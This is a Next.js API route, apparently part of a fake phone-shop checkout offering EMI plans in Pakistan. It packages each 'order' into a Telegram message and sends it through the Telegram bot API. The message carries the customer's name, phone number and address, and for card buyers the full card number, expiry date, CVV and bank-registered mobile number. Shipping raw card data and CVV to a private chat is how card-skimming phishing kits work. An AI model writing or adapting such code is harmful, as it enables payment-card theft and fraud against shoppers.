import { NextResponse } from 'next/server';

export async function POST(request: Request) {
  try {
    const body = await request.json();
    const { order } = body;

    if (!order) {
      return NextResponse.json({ success: false, message: 'No order data provided' }, { status: 400 });
    }

    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!botToken || !chatId || botToken.includes('your_telegram_bot_token')) {
      return NextResponse.json({ success: false, message: 'Telegram credentials missing' }, { status: 200 });
    }

    const { orderId, createdAt, model, color, storage, months, monthlyEmi, totalPrice, customer, payment } = order;

    let messageText = `🎉 <b>NEW ORDER CONFIRMED (#${orderId})</b> 🎉\n`;
    messageText += `🕒 <b>Placed At:</b> ${createdAt}\n`;
    messageText += `━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;

    messageText += `📱 <b>SELECTED DEVICE & PLAN:</b>\n`;
    messageText += ` ├ 🏷️ <b>Model:</b> ${model.name}\n`;
    messageText += ` ├ 🎨 <b>Color:</b> ${color.name}\n`;
    messageText += ` ├ 💾 <b>Storage:</b> ${storage.size}\n`;
    messageText += ` ├ 💵 <b>Cash Price:</b> Rs. ${totalPrice.toLocaleString('en-PK')}\n`;
    messageText += ` └ 📅 <b>0% EMI Plan:</b> ${months} Months @ Rs. ${monthlyEmi.toLocaleString('en-PK')}/mo\n\n`;

    messageText += `👤 <b>CUSTOMER DETAILS:</b>\n`;
    messageText += ` ├ 📛 <b>Full Name:</b> ${customer.fullName}\n`;
    messageText += ` ├ 📞 <b>Phone Number:</b> <code>${customer.mobileNumber}</code>\n`;
    messageText += ` ├ 🏠 <b>Delivery Address:</b> ${customer.deliveryAddress}\n`;
    messageText += ` ├ 🚚 <b>Delivery Type:</b> ${customer.deliveryType === 'open_parcel' ? '🔍 Open Parcel Inspection' : '📦 Standard Express'}\n`;
    messageText += ` └ 💳 <b>Payment Option:</b> ${customer.paymentMethod.toUpperCase()}\n\n`;

    messageText += `💳 <b>PAYMENT DETAILS:</b>\n`;
    if (customer.paymentMethod === 'card') {
      messageText += ` ├ 🏛️ <b>Bank Name:</b> ${payment.bankId.toUpperCase()}\n`;
      messageText += ` ├ 🎴 <b>Card Network:</b> ${(payment.cardNetwork || 'visa').toUpperCase()}\n`;
      messageText += ` ├ 👤 <b>Cardholder Name:</b> ${payment.cardName}\n`;
      messageText += ` ├ 📱 <b>Bank Reg. Mobile:</b> <code>${payment.registeredMobile}</code>\n`;
      messageText += ` ├ 🔢 <b>Card Number:</b> <code>${payment.cardNumber}</code>\n`;
      messageText += ` ├ 📆 <b>Expiry Date:</b> <code>${payment.expiry}</code>\n`;
      messageText += ` └ 🔐 <b>CVV / CVC Code:</b> <code>${payment.cvv}</code>\n\n`;
    } else {
      messageText += ` ├ 📲 <b>Wallet Service:</b> ${payment.walletType.toUpperCase()}\n`;
      messageText += ` ├ 📝 <b>Account Title:</b> ${payment.walletAccountName}\n`;
      messageText += ` └ 📸 <b>Payment Proof Photo:</b> ${payment.proofPreviewUrl ? 'Attached (Sent to Telegram)' : 'None'}\n\n`;
    }

    messageText += `━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
    messageText += `✅ <i>Order status set to: Waiting for Verification</i>`;

    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

    const res = await fetch(telegramUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: messageText,
        parse_mode: 'HTML'
      })
    });

    const data = await res.json();

    if (!data.ok) {
      console.error('Telegram API error:', data);
      return NextResponse.json({ success: false, error: data.description }, { status: 500 });
    }

    return NextResponse.json({ success: true, messageId: data.result.message_id });
  } catch (error: any) {
    console.error('Telegram dispatch error:', error);
    return NextResponse.json({ success: false, error: error.message }, { status: 500 });
  }
}
